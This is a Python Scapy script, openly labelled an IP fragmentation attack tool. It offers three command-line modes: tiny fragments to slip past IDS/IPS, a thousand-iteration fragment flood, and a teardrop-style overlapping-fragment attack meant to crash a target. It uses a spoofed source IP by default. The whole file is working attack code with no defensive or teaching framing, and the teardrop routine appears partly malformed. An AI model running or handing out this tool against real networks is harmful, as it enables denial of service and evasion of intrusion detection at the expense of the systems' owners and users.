# Usage : python fragmentation.py <target_ip> -s <src_ip> -p <port> -i <id> -t <type> -d <data> -f <fragsize>

import argparse
from scapy.all import IP, UDP, fragment, send

def bypass_ids(target_ip, src_ip, fragment_id, port, payload):
    """ 
    Generate very small fragments to bypass IDS/IPS systems.
    """
    print("[+] Launching IDS/IPS bypass attack...")
    fragments = fragment(
        IP(dst=target_ip, src=src_ip, id=fragment_id) / UDP(sport=12345, dport=port) / payload, 
        fragsize=8  # Small fragment size for IDS/IPS evasion
    )
    send_fragments(fragments, target_ip) 

def flooding(target_ip, src_ip, fragment_id, port, payload, fragsize):
    """
    Send a large number of fragments to flood the target's fragment table or the network.
    """
    print("[+] Launching flooding attack...")
    for _ in range(1000):  # Number of iterations (adjustable)
        fragments = fragment(
            IP(dst=target_ip, src=src_ip, id=fragment_id) / UDP(sport=12345, dport=port) / payload,
            fragsize=fragsize  # Adjustable fragment size
        )
        send_fragments(fragments, target_ip)

def teardrop(target_ip, src_ip, fragment_id, port):
    """
    Create overlapping fragments to crash the target system.
    """
    print("[+] Launching teardrop attack...")
    ip = IP(dst=target_ip, src=src_ip, id=fragment_id, flags="MF") 
    payload1 = b"A" * 1300  # First fragment
    payload2 = b"B" * 1300  # Second fragment overlapping the first
    fragments = [
        ip / payload1,                     # Initial fragment
        ip / payload2 / b"Overlapping"    # Overlapping fragment
    ]
    send_fragments(fragments, target_ip)

def send_fragments(fragments, target_ip):
    """
    Send the generated fragments to the target.
    """
    print(f"[+] Sending {len(fragments)} fragments to {target_ip}")
    for fragment in fragments:
        send(fragment, verbose=False)  # Silent mode to avoid excessive output
    print("[+] Fragments sent successfully!")

def main():
    # Argument parser for command-line options
    parser = argparse.ArgumentParser(description="IP fragmentation attack script with multiple attack types.")
    parser.add_argument("target_ip", help="Target IP address.")
    parser.add_argument("-s", "--src_ip", default="192.168.1.1", help="Spoofed source IP address (default: 192.168.1.1).")
    parser.add_argument("-p", "--port", type=int, default=80, help="Destination port (default: 80).")
    parser.add_argument("-i", "--id", type=int, default=12345, help="IP identifier (default: 12345).")
    parser.add_argument("-t", "--type", choices=["ids", "flood", "teardrop"], required=True,
                        help="Type of attack: 'ids' for IDS/IPS bypass, 'flood' for flooding, 'teardrop' for teardrop.")
    parser.add_argument("-d", "--data", default="X" * 1200, help="Payload data to include in the packet (default: 1200 'X' characters).")
    parser.add_argument("-f", "--fragsize", type=int, default=512, help="Fragment size (default: 512, used only for flooding).")

    args = parser.parse_args()

    # Determine the type of attack and execute the appropriate function
    if args.type == "ids":
        bypass_ids(args.target_ip, args.src_ip, args.id, args.port, args.data)
    elif args.type == "flood":
        flooding(args.target_ip, args.src_ip, args.id, args.port, args.data, args.fragsize)
    elif args.type == "teardrop":
        teardrop(args.target_ip, args.src_ip, args.id, args.port)
    else:
        print("[-] Invalid attack type. Use 'ids', 'flood', or 'teardrop'.")

if __name__ == "__main__":
    main()
